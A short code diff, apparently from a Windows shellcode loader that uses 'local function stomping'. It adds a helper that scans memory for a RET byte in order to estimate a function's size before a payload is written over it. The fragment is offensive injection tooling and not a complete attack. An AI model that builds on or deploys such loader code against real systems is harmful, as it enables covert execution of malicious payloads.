@@ -24,6 +24,16 @@ BOOL WritePayloadViaLocalFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload
 	return TRUE;
 }
 
+PBYTE findRetInstruction(PVOID function_start) {
+	unsigned char* ptr = (unsigned char*)function_start;
+	for (int i = 0; i < 0x400; i++) { // Scan up to 1024 bytes (arbitrary limit)
+		if (ptr[i] == 0xC3) {         // Check for RET instruction (0xC3)
+			return &ptr[i];
+		}
+	}
+	return NULL; // No RET found in the scanned range
+}
+
 size_t GetFunctionSize(PVOID function_start) {
     PBYTE retAddress = (PBYTE)findRetInstruction(function_start);
     if (!retAddress) {
